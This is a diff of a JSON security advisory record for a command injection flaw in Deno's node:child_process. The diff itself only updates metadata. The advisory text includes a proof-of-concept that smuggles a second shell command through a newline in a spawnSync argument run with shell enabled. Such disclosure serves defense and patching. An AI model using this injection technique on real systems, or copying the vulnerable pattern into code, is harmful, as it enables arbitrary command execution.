@@ -1,19 +1,20 @@
 {
-    "schema_version": "1.7.4",
+    "schema_version": "1.8.0",
     "id": "JLSEC-2026-116",
-    "modified": "2026-04-14T13:10:46.494Z",
+    "modified": "2026-07-17T23:50:43.660Z",
     "published": "2026-04-14T13:10:46.494Z",
     "upstream": [
-        "EUVD-2026-7794",
         "CVE-2026-27190",
-        "GHSA-hmh4-3xvx-q5hr"
+        "GHSA-hmh4-3xvx-q5hr",
+        "EUVD-2026-7794"
     ],
     "summary": "Deno has a Command Injection via Incomplete shell metacharacter blocklist in node:child_process",
     "details": "## Summary\n\nA command injection vulnerability exists in Deno's `node:child_process` implementation.\n\n## Reproduction\n\n```javascript\nimport { spawnSync } from \"node:child_process\";\nimport * as fs from \"node:fs\";\n\n// Cleanup\ntry { fs.unlinkSync('/tmp/rce_proof'); } catch {}\n\n// Create legitimate script\nfs.writeFileSync('/tmp/legitimate.ts', 'console.log(\"normal\");');\n\n// Malicious input with newline injection\nconst maliciousInput = `/tmp/legitimate.ts\\ntouch /tmp/rce_proof`;\n\n// Vulnerable pattern\nspawnSync(Deno.execPath(), ['run', '--allow-all', maliciousInput], {\n  shell: true,\n  encoding: 'utf-8'\n});\n\n// Verify\nconsole.log('Exploit worked:', fs.existsSync('/tmp/rce_proof'));\n```\n\nRun: `deno run --allow-all poc.mjs`\n\nThe file `/tmp/rce_proof` is created, confirming arbitrary command execution.\n\n## Mitigation\n\nAll users need to update to the patched version (Deno v2.6.8).",
     "severity": [
         {
             "type": "CVSS_V3",
-            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "source": "NVD"
         }
     ],
     "affected": [
@@ -41,6 +42,10 @@
     "references": [
         {
             "type": "WEB",
+            "url": "https://github.com/advisories/GHSA-hmh4-3xvx-q5hr"
+        },
+        {
+            "type": "WEB",
             "url": "https://github.com/denoland/deno/commit/9132ad958c83a0d0b199de12b69b877f63edab4c"
         },
         {
@@ -54,10 +59,6 @@
         {
             "type": "WEB",
             "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27190"
-        },
-        {
-            "type": "WEB",
-            "url": "https://github.com/advisories/GHSA-hmh4-3xvx-q5hr"
         }
     ],
     "credits": [
@@ -74,15 +75,18 @@
         "sources": [
             {
                 "id": "CVE-2026-27190",
-                "imported": "2026-04-14T12:58:55.203Z",
-                "modified": "2026-03-02T13:35:52.260Z",
+                "imported": "2026-07-17T21:10:57.311Z",
+                "modified": "2026-06-17T10:26:49.147Z",
                 "published": "2026-02-20T21:19:28.090Z",
                 "url": "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-27190",
-                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27190"
+                "html_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27190",
+                "database_specific": {
+                    "status": "Analyzed"
+                }
             },
             {
                 "id": "GHSA-hmh4-3xvx-q5hr",
-                "imported": "2026-04-14T12:58:59.239Z",
+                "imported": "2026-07-17T21:10:57.469Z",
                 "modified": "2026-02-20T22:20:05Z",
                 "published": "2026-02-19T20:31:41Z",
                 "url": "https://api.github.com/advisories/GHSA-hmh4-3xvx-q5hr",
@@ -90,7 +94,7 @@
             },
             {
                 "id": "EUVD-2026-7794",
-                "imported": "2026-04-14T12:58:57.054Z",
+                "imported": "2026-07-17T21:11:07.388Z",
                 "modified": "2026-02-24T18:30:43Z",
                 "published": "2026-02-20T20:52:11Z",
                 "url": "https://euvdservices.enisa.europa.eu/api/enisaid?id=EUVD-2026-7794",
